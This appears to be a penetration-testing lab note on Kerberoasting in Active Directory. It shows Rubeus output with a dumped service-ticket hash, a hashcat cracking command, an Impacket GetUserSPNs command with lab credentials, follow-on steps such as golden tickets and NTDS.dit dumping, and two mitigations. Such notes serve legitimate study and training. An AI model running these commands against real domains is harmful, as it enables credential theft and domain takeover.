# Kerberoasting w/ Rubeus & Impacket
- Kerberoasting allows a user to request a service ticket for any service with a registered SPN
- Use that ticket to crack the service password
- If service has a registered SPN then it can be Kerberoastable

Enumerate Kerberoastable; use BloodHound to find all Kerberoastable accounts

## Kerberoasting w/ Rubeus
- Dump Kerberos hash of any Kerberoastable users

<pre>controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 


[*] Action: Kerberoasting 

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users 

[*] Total kerberoastable users : 1


[*] SamAccountName         : SQLService 
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
[*] PwdLastSet             : 5/25/2020 10:28:26 PM                          
[*] Supported ETypes       : RC4_HMAC_DEFAULT                               
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$74ED9A6944729B855529A7E1CEBE28F5$7F4D43C26FB1F736B347B99043E3085EFE032B 
                             C53A5D2EE0DFF7776C30D2C1E75C5993B6957D0FC1C114C187CF13403B25419009730AD0A2019706 
                             D37C654C7AE9E78CD173AA7AD67D7133D87D6000BE6D54F5D8585814436F8BFCA77220C6504E462D 
                             4EBFA0B30798E06FAA09A877B6D0864017D8E9468735C8FEC84A243DA071BBB9A6AE37FD2D243891 
                             47BC9F0B98355E4ED0544DA0FF00337C3C916899DD4101A060A35E7D95E6E896AD3ECD4CA8131FDA 
                             CAC6173333CCACE91A46D1B2098CDC99E4EE46BF29D3602BE1C210E198CCFB7B5818F277B8DD4854 
                             4CFCC738A6938FBAB633CF1B9AC74243A1DB7E25266E0622011D6C28F2E500C0204F9293E172508E 
                             56603B06B81C4726F2C4FA73724C3BD69ABC68A3AA59E7F6689FD32A8B73507FDDD4B5FA86F9E056 
                             42057AA8CE739094837A018E3EF63926B5101173A52F480C8AA50E810A38DFDE82E032E1E5977FBD 
                             E59EA0C63FD2001E1A48BA9F6E9125719A342FF798A0C715CCD513DAB1A27CD16DE3281D7A05A712
                             BE6D34F34068B4E918535CBA0963CFA303345B40EEF6CAE41E3B8A810DC8AB1C33973FA2176D9B8B
                             FB6F60A3457C17D4ABC4956C32EF19C4C17387DE9881B892F22605F1D259330C5D4C52120C98A491
                             9CE2C4BAB9FAD6D579544A326517AF4C538C2873AECF796562E4C30C8AC3AEB8D6D6A9634026C9F3
                             46B1797A3A5181B291C494BE0A0EC126DF65F26F891E4033781B9E2D0D29FF710AFC880D4814B8D1
                             50A4B91BEAADC21BE807269DF387CC578735F97D40D85F480E4BA2B35BBDEC3834EB12D1900BCE31
                             1EC9CFCF4440932E010B64B885C59D6ACAFED3ED4958A51CE50D419A11884E55D398480761AD6547
                             E7BB965C93F7A4418804634D8457A7FA500297866DA86ACBB2D615EC86955A3CCF75FDEA912D73B8
                             EF07B2EBF4D85105C880C1A7AF0D83D965F5C10162C67C3E260F9C6C7A71F29B83C3DDF668C5155E
                             3D649098B33C9DAC89302C24EFCF8EBF875E277541CDCE9FA29A954CE021A161ED5FDB09DB18F0A9
                             7B0918E74B1A9A9D4D7879DE7A458A5636E9507296D60538A426E61F63E61EC95BC49E2C1886A0AC
                             7C8A02DEDF49C87763DBE16B6CD293DDE6EE2A4763A45C88B334D4AB47CDA4956D35C84A6BA5FBAB
                             2FF1C6A9DAA65C650A5C8AD155691DC54552C3729C81B37237F9BB377ED12F97245436E95F8B7136
                             6F1CEA935C405819A99E11D4DB170768FA8CAE4B93C5A13677CF40DE862568CF6E17A435A48920D5
                             987303F4576D6FDBCF1CD3C3B4B83BC81F2C2B1AF149E7EFC970AE6C17CFE2120EF94A7CE3883BB8
                             5D25853243E2789291146D557E123219915AF0265151239CC6E258A5DE719AC44F56F61C02B2536F
                             C6A3D58A17D8AEDB557E1FB17E0A710E8991BA5ADE342A782D3D7514F8BE10162F6F6474A1FD0031
                             0E7F9F9EE735F8F61095D215EFA2F0A58FD2DA0B7A86A1221C8F9FA2AAA113562EB5152A9BFFF322
                             431755E6579A401D5615B9F6FFFB67B982B7FC9CEF33BE7E758573D5C67740BD179CF90F43E7C8E2
                             1AC25F8523AF3228DC89F815FFA3549B388198A040971A77148ABBE5BA98B5DDB87E726AE5F609E3
                             063224F29EE60C58B7A0498FEF9E91E4AC84559FB632B8B535F1EADD71</pre>

## Hashcat
Use hashcat to crack Kerberos 5 hash
<pre>hashcat -m13100 -a 0 hash.txt passwords.txt</pre>

## Impacket
1) Navigate to preferred directory to save tools in
2) Download precomplied package: https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
3) <pre>cd impacket-0.9.19 </pre>
4) <pre>pip install </pre>

## Kerberoasting w/ Impacket
1) Navigate to where GetUsersSPNs.py is located

<pre>cd /usr/share/doc/python3-impacket/examples </pre>

2) Dump Kerberos hash for all Kerberoastable accounts it can find on domain

<pre>sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.183.143 -request </pre>

4) Crack the hash

<pre>hashcat -m 13100 -a 0 hash.txt passwords.txt</pre>

## What can a Service Account do?
- Service Account = Domain Admin = Golden/Silver ticket + dump NTDS.dit
- Service Account is not Domain Admin = log on to other systems + escalate privileges

## Kerberoasting Mitigation
- Strong password policy
- Do not make Service Accounts Domain Admin